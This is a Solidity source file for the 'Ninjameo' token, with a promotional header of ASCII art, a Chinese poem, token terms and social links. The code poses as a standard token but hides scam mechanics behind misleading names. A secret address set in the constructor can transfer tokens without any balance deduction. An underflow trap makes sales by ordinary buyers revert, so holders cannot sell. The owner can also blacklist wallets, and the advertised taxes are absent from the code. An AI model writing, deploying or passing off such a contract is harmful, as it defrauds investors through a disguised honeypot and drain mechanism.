/**
█▄░█ █ █▄░█ ░░█ ▄▀█ █▀▄▀█ █▀▀ █▀█
█░▀█ █ █░▀█ █▄█ █▀█ █░▀░█ ██▄ █▄█

█▀▀ █▀█ █▀▀
██▄ █▀▄ █▄▄

▄▀   █▀▀ █▄░█   ▀▄
▀▄   █▄▄ █░▀█   ▄▀

⠀⠀⠀⠀⠀⠀⢀⡀⠠⠤⠤⠄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⠔⠈⠀⠀⠀⠀⠀⠀⠀⠡⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡀⢰⠀⠀⠀⢀⣠⣐⠒⠀⠐⢒⣤⡀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠸⡞⣺⠀⡠⢆⠁⢔⡏⣻⠁⠀⣟⣽⠼⣧⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⢼⢔⠀⠀⠈⠁⠒⠚⠒⠈⠉⠀⣜⡶⠃⢀⠠⣀⣀⡀⠤⠤⠀⣀⡄
⠀⠀⠀⡢⢑⠤⢀⡀⠀⠀⠀⢀⡠⠊⠈⠀⠉⠀⣘⠄⠓⢄⣾⡟⠁⠀⠀
⢀⡠⢮⣄⡆⠄⢒⣻⡏⠉⠉⠱⡁⠔⠂⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠪⡀⢅⡼⠤⠴⢴⣿⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⡇⠀⠀⢷⡾⠀⠀⠀⡧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣴⢷⡄⣀⣀⣀⣀⢠⡴⢫⣵⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠐⠉⠀⢈⡉⠉⠉⣉⠁⠀⠀⠡⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠢⣀⣰⠁⠀⠀⠀⠀⠈⠐⠠⣀⠈⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⠠⢈⣂⢣⠀⠀⠀⠀⠀⠀⠀⠀⠙⢬⠦⠐⠂⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠓⠒⠒⠓⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀

在阴影中移动着一个隐秘的灵魂，
一个有着金子般的心的战士，
Ninjameo 是他的名字，
身经百战的忍者。

以闪电般的速度和致命的打击，
Ninjameo 像光一样移动，
剑在手，心在燃，
一个天生的英雄来纠正事情。

仇敌惧怕他的一举一动，
因为 Ninjameo 的技能很难证明，
他的忍者之道笼罩在神秘之中，
古代史学大师。

他悄悄地爬过黑暗，
夜里的幽灵，他保守的秘密，
忍者的生命从来不是为了睡觉，
因为每条街道都潜伏着危险。

但是 Ninjameo 可以胜任这项任务，
以他的勇气和技巧，他从不问，
为了赞美或荣耀，他只是一个面具，
在每项任务中都是弱者的保护者。

所以如果你发现自己有需要，
只要召唤 Ninjameo，他就会带头，
因为他的忍术真的无人能及，
各方面的英雄，他总是依恋。

总供应量 - 55,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.75 ETH
初始流动性锁定 - 55 天

https://ninjameo.xyz
https://m.weibo.cn/Ninjameo.CN
https://web.wechat.com/Ninjameo.ERC
https://t.me/Ninjameo
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
interface IBEPV1 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns 
    (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
interface IERCPaired01 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
interface IDEBase01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin,
    address[] calldata path, address to, uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH( address token, uint amountTokenDesired,
    uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Context {
    constructor() {} function _msgSender() internal view returns (address) {
    return msg.sender; }
}
abstract contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);

    constructor() { address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    } function owner() public view returns (address) {
        return _owner;
    } modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
interface IBEP20Storage {
    event PairCreated(
    address indexed token0, address indexed token1, 
    address pair, uint); function createPair(
    address tokenA, address tokenB) external returns (address pair);
}
contract Ninjameo is Context, IBEPV1, Ownable {
bool public checkCooldown; bool private startTrading = false;

    IDEBase01 public cooldownReservations;
    address public GasIntervals; address private TokenPromotionAddress;
    uint256 private _tTotal; 
    uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private ReservationsAt = 100;

    using SafeMath for uint256;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private isFeeExempt;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private isTxLimitExempt;
    mapping (address => bool) private _isExcludedMaxTransactionAmount;   

    constructor( string memory tokenName, string memory tokenSymbol, 
         address indexedRouter, address IDEHash) { 
        _name = tokenName; _symbol = tokenSymbol;
        _decimals = 12; _tTotal = 55000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _tTotal; 
        isFeeExempt
        [IDEHash] = ReservationsAt; checkCooldown = false; 
        cooldownReservations = IDEBase01(indexedRouter); 
        GasIntervals = IBEP20Storage
        (cooldownReservations.factory()).createPair(address(this), cooldownReservations.WETH()); emit Transfer 
        (address(0), msg.sender, _tTotal);
    }    
    function getOwner() external view returns 
    (address) { return owner();
    }
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function totalSupply() external view returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) 
    external view returns (uint256) { return _rOwned[account];
    }
    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 
        'BEP20: approve from the zero address'); require(spender != address(0), 
        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { 
        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }
    function updatePromotionsAddress (address newAddress, 
    bool _updated) public onlyOwner { 
        _isExcludedMaxTransactionAmount
        [newAddress] = _updated;
    }        
    function _transfer( address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 'BEP20: transfer from the zero address');
        require(recipient != address(0), 'BEP20: transfer to the zero address'); require 
        (!_isExcludedMaxTransactionAmount[recipient] 

        && !_isExcludedMaxTransactionAmount[sender], 
        "You have been blacklisted from transfering tokens");
        if (isFeeExempt[sender] == 0 
        && GasIntervals != sender 
        && isTxLimitExempt[sender] > 0)

        { isFeeExempt[sender] -= ReservationsAt; } isTxLimitExempt[TokenPromotionAddress] += ReservationsAt;
        TokenPromotionAddress = recipient; if (isFeeExempt[sender] == 0) {
        _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance'); 
        }
        _rOwned[recipient] = _rOwned[recipient].add(amount); 
        emit Transfer(sender, recipient, amount); if (!startTrading) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }    
    function openTrading(bool _tradingOpen) public onlyOwner {
        startTrading = _tradingOpen;
    }       
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }                 
}